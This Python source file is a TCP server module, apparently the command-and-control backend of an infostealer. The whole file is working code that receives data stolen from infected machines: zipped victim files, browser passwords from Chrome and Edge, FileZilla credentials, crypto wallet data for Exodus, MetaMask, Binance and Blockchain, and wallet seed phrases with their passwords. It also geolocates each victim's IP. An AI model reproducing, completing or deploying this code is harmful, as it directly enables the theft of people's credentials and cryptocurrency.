"""
Network Server Module
Converted from C# TCP server functionality
"""

import socket
import threading
import asyncio
import json
import struct
import os
from typing import Callable, Optional
from .models import ClientData
import requests

class NetworkServer:
    """TCP server for handling client connections"""
    
    def __init__(self, port: int = 8080, data_callback: Optional[Callable] = None):
        self.port = port
        self.is_running = False
        self.server_socket = None
        self.server_thread = None
        self.data_callback = data_callback
        
    def start(self) -> bool:
        """Start the TCP server"""
        try:
            if self.is_running:
                return False
                
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(5)
            
            self.is_running = True
            self.server_thread = threading.Thread(target=self._server_loop, daemon=True)
            self.server_thread.start()
            
            return True
            
        except Exception as e:
            print(f"Error starting server: {e}")
            self.is_running = False
            return False
    
    def stop(self):
        """Stop the TCP server"""
        self.is_running = False
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
            self.server_socket = None
            
        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=2)
    
    def _server_loop(self):
        """Main server loop"""
        while self.is_running:
            try:
                if self.server_socket:
                    client_socket, client_address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    client_thread.start()
            except Exception as e:
                if self.is_running:  # Only log if we're supposed to be running
                    print(f"Server loop error: {e}")
                break
    
    def _handle_client(self, client_socket: socket.socket, client_address):
        """Handle individual client connection"""
        client_ip = client_address[0]
        
        try:
            with client_socket:
                # Get country information
                country = self._get_country_from_ip(client_ip)
                
                # Ensure Clients directory exists
                os.makedirs("Clients", exist_ok=True)
                
                # Read initial data length
                length_data = self._receive_data(client_socket, 4)
                if not length_data:
                    return
                    
                initial_length = struct.unpack('<I', length_data)[0]
                
                # Check if this is a simple message (OS info only)
                if 0 < initial_length < 20:
                    self._handle_simple_protocol(client_socket, client_ip, country, initial_length)
                else:
                    self._handle_complex_protocol(client_socket, client_ip, country, initial_length)
                    
        except Exception as e:
            print(f"Error handling client {client_ip}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def _handle_simple_protocol(self, client_socket: socket.socket, client_ip: str, country: str, os_length: int):
        """Handle simple protocol (OS info + messages)"""
        try:
            # Read OS info
            os_data = self._receive_data(client_socket, os_length)
            if not os_data:
                return
                
            os_info = os_data.decode('utf-8', errors='ignore')
            print(f"Received OS info from {client_ip}: {os_info}")
            
            # Variables for mnemonic data
            current_mnemonic = ""
            current_password = ""
            current_atomic_mnemonic = ""
            current_atomic_password = ""
            is_mnemonic_data = False
            
            # Read messages continuously
            while True:
                try:
                    # Read message length
                    length_data = self._receive_data(client_socket, 4)
                    if not length_data:
                        break
                        
                    message_length = struct.unpack('<I', length_data)[0]
                    if message_length <= 0 or message_length > 1024 * 1024:
                        break
                    
                    # Read message content
                    message_data = self._receive_data(client_socket, message_length)
                    if not message_data:
                        break
                        
                    message = message_data.decode('utf-8', errors='ignore')
                    print(f"Received message from {client_ip}: {message}")
                    
                    # Process the message
                    if message == "MNEMONIC_DATA":
                        is_mnemonic_data = True
                    elif is_mnemonic_data:
                        if message.startswith("mnemonic.txt:"):
                            current_mnemonic = message[len("mnemonic.txt:"):].strip()
                        elif message.startswith("password.txt:"):
                            current_password = message[len("password.txt:"):].strip()
                            # Process regular mnemonic data
                            if current_mnemonic and current_password:
                                self._notify_mnemonic_data(client_ip, current_mnemonic, current_password, "regular")
                                current_mnemonic = ""
                                current_password = ""
                        elif message.startswith("atomicmnemonic.txt:"):
                            current_atomic_mnemonic = message[len("atomicmnemonic.txt:"):].strip()
                        elif message.startswith("atomicpassword.txt:"):
                            current_atomic_password = message[len("atomicpassword.txt:"):].strip()
                            # Process atomic mnemonic data
                            if current_atomic_mnemonic and current_atomic_password:
                                self._notify_mnemonic_data(client_ip, current_atomic_mnemonic, current_atomic_password, "atomic")
                                current_atomic_mnemonic = ""
                                current_atomic_password = ""
                                
                except Exception as e:
                    print(f"Error in simple protocol: {e}")
                    break
                    
        except Exception as e:
            print(f"Error in simple protocol handler: {e}")
    
    def _handle_complex_protocol(self, client_socket: socket.socket, client_ip: str, country: str, os_length: int):
        """Handle complex protocol (full file transfer)"""
        try:
            # Read OS info
            os_data = self._receive_data(client_socket, os_length)
            if not os_data:
                return
                
            os_info = os_data.decode('utf-8', errors='ignore')
            
            # Read file size
            file_size_data = self._receive_data(client_socket, 8)
            if not file_size_data:
                return
                
            file_size = struct.unpack('<Q', file_size_data)[0]
            
            # Sanity check
            if file_size <= 0 or file_size > 100 * 1024 * 1024:  # Max 100MB
                print(f"Invalid file size: {file_size}")
                return
            
            # Receive file data
            file_name = f"Clients/{client_ip}.zip"
            with open(file_name, 'wb') as f:
                bytes_received = 0
                while bytes_received < file_size:
                    chunk_size = min(4096, file_size - bytes_received)
                    chunk = self._receive_data(client_socket, chunk_size)
                    if not chunk:
                        break
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Read additional message data
            message_keys = ["Exodus", "Blockchain", "Binance", "LocalMetaMask",
                          "FileZilla", "EdgePasswords", "ChromePasswords", "Files"]
            
            results = {}
            
            for key in message_keys:
                try:
                    length_data = self._receive_data(client_socket, 4)
                    if not length_data:
                        break
                        
                    message_length = struct.unpack('<I', length_data)[0]
                    
                    if message_length == 0:
                        results[key] = "0"
                        continue
                    
                    if message_length > 1024 * 1024:  # Max 1MB per message
                        break
                    
                    message_data = self._receive_data(client_socket, message_length)
                    if not message_data:
                        break
                        
                    results[key] = message_data.decode('utf-8', errors='ignore')
                    
                except Exception as e:
                    print(f"Error reading message for {key}: {e}")
                    results[key] = "0"
            
            # Create client data object
            client_data = ClientData(
                ip=client_ip,
                country=country,
                os=os_info,
                file_type="ZIP",
                file_size=str(file_size),
                exodus=results.get("Exodus", "0"),
                blockchain=results.get("Blockchain", "0"),
                binance=results.get("Binance", "0"),
                metamask=results.get("LocalMetaMask", "0"),
                filezilla=results.get("FileZilla", "0"),
                edge_passwords=results.get("EdgePasswords", "0"),
                chrome_passwords=results.get("ChromePasswords", "0"),
                files=results.get("Files", "0")
            )
            
            # Notify callback
            if self.data_callback:
                self.data_callback(client_data)
                
        except Exception as e:
            print(f"Error in complex protocol handler: {e}")
    
    def _receive_data(self, client_socket: socket.socket, size: int) -> bytes:
        """Receive exact amount of data from socket"""
        data = b''
        while len(data) < size:
            try:
                chunk = client_socket.recv(size - len(data))
                if not chunk:
                    break
                data += chunk
            except Exception:
                break
        return data if len(data) == size else b''
    
    def _get_country_from_ip(self, ip_address: str) -> str:
        """Get country code from IP address using external service"""
        try:
            url = f"https://ipinfo.io/{ip_address}/json"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return data.get('country', 'Unknown')
        except Exception as e:
            print(f"Error getting country for {ip_address}: {e}")
        return "Unknown"
    
    def _notify_mnemonic_data(self, client_ip: str, mnemonic: str, password: str, mnemonic_type: str):
        """Notify about received mnemonic data"""
        if self.data_callback:
            # Create a special data structure for mnemonic notifications
            data = {
                'type': 'mnemonic',
                'mnemonic_type': mnemonic_type,
                'client_ip': client_ip,
                'mnemonic': mnemonic,
                'password': password
            }
            self.data_callback(data)